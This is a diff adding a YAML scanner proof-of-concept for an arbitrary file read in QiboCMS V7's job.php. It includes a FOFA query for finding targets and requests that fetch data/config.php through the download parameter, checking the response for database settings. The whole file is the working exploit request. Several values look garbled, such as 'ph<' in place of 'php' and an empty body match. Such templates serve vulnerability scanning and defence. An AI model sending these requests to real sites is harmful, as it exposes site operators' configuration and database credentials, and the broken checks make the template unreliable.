@@ -1,0 +1,26 @@
+id: poc-yaml-qibocms-v7-job-php-anyfile-read
+info:
+  name: 齐博CMS V7 job.php 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: qibocms
+  fofa: app="齐博软件-v7"
+variables:
+  path: base64("data/config.ph<")
+requests:
+- method: GET
+  path: /do/job.php?job=download&url=data/config.ph<
+  expression: status_code == 200 && contains(body,"")
+- method: GET
+  path: /do/job.php?job=download&url={{.path}}
+  expression: 'status_code == 200
+
+    && contains(body,"php")
+
+    && contains(body,"$webdb")
+
+    && content_type == "ph<"
+
+    '
+transport: http
